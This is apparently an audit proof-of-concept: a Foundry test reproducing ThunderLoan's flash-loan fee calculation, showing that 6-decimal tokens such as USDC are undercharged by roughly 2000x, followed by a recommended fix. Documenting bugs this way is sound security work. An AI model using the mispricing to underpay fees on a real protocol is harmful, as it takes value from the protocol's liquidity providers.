pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal, runnable unit test that mirrors ThunderLoan's buggy fee math
// and demonstrates massive undercharge for 6-decimal tokens like USDC.
contract ThunderLoanDecimalsMismatchTest is Test {
    uint256 constant FEE_PRECISION = 1e18;        // ThunderLoan.s_feePrecision
    uint256 constant FEE_RATE = 3e15;             // 0.3% (ThunderLoan.s_flashLoanFee)
    uint256 constant USDC_PRICE_IN_WETH = 5e14;   // 1 USDC ≈ 0.0005 WETH (scaled 1e18)
    uint8 constant USDC_DECIMALS = 6;

    // Mirrors ThunderLoan.getCalculatedFee math
    function buggyThunderFee(uint256 amountRaw) internal pure returns (uint256) {
        // valueInWeth uses 1e18 denominator irrespective of token decimals
        uint256 valueInWeth = (amountRaw * USDC_PRICE_IN_WETH) / FEE_PRECISION;
        // fee is computed in WETH terms, then (incorrectly) treated as underlying units by the protocol
        return (valueInWeth * FEE_RATE) / FEE_PRECISION;
    }

    // What the protocol should effectively charge in underlying units for a 0.3% fee
    // (price cancels when converting WETH-value fee back to underlying); no oracle needed.
    function expectedUnderlyingFee(uint256 amountRaw) internal pure returns (uint256) {
        return (amountRaw * FEE_RATE) / FEE_PRECISION; // 0.3% of the borrowed underlying
    }

    function test_usdc_fee_massively_undercharged() public {
        // Borrow 1,000,000 USDC (in base units: 1e6 * 1e6 = 1e12)
        uint256 amountRaw = 1_000_000 * (10 ** USDC_DECIMALS); // 1,000,000e6 = 1e12

        uint256 buggy = buggyThunderFee(amountRaw);            // ~1.5 USDC
        uint256 expected = expectedUnderlyingFee(amountRaw);   // 3,000 USDC

        assertGt(expected, buggy);
        // Undercharge is ≈ 1 / price_in_WETH ≈ 1 / 0.0005 = 2000x
        assertGt(expected / 1000, buggy); // at least 1000x smaller
    }
}


## Suggested Mitigation
Do not use the oracle price in getCalculatedFee when the fee is collected in the underlying token. Compute fee directly as a percentage of the borrowed amount in underlying units: fee = Math.mulDiv(amount, s_flashLoanFee, 1e18). This removes unit/decimal pitfalls and rounding bias. If a value-in-WETH quote is still desired for display, compute it off-chain or as a separate view method. If you insist on a value-based fee with on-chain price, you must normalize by token decimals and then convert back to underlying units (which cancels price): valueInWeth = Math.mulDiv(amount, price, 10**decimals(token)); feeInWeth = Math.mulDiv(valueInWeth, s_flashLoanFee, 1e18); feeInUnderlying = Math.mulDiv(feeInWeth, 10**decimals(token), price). The price terms cancel, yielding the simpler formula above, so prefer the simpler, oracle-free computation.



